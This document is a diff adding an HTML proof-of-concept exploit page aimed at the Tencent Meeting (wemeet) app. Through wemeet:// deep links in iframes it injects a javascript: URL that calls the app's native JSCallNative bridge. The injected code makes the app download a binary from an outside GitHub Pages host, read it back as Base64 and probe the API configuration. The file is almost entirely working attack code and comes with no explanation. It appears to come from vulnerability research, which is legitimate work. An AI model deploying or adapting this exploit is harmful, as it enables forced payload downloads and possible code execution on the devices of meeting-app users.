@@ -1,0 +1,20 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P30</h1>
+<script>
+document.title='P30L-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var u='https://gitwhs.github.io/wm-poc-rce/p25.bin';
+var md='6ee4dea31426a959a8983707ee1fc478';
+var js="javascript:(function(){document.title='P30INJ:'+location.host;window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P30CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String((r&&r.message)||(r&&r.data&&r.data.msg)||'').slice(0,40)};function c(m,e,p){window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:m+'.'+e}))}c('CommonPlugin','DownloadFile',{url:'"+u+"',fileName:'p30.bin'});setTimeout(function(){c('CommonPlugin','DownloadFile',{url:'"+u+"',file_name:'p30b.bin',save_path:'p30b.bin',file_size:267,md5:'"+md+"'})},300);setTimeout(function(){c('MeetlogWebPlugin','DownloadFile',{url:'"+u+"',file_name:'p30c.bin',file_size:267,md5:'"+md+"'})},600);setTimeout(function(){c('MeetlogWebPlugin','DownloadFile',{file_url:'"+u+"',file_name:'p30d.bin',file_size:267,md5:'"+md+"'})},900);setTimeout(function(){c('CommonPlugin','GetFileBase64',{fileName:'p30.bin'})},8000);setTimeout(function(){c('CommonPlugin','CheckJsApiConfig',{})},8500)})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P30L-OFFICIAL'); }, 600);
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(js),'P30L-JSINJ'); }, 12000);
+setTimeout(function(){ document.title='P30L-DONE'; }, 28000);
+</script>
+</body></html>
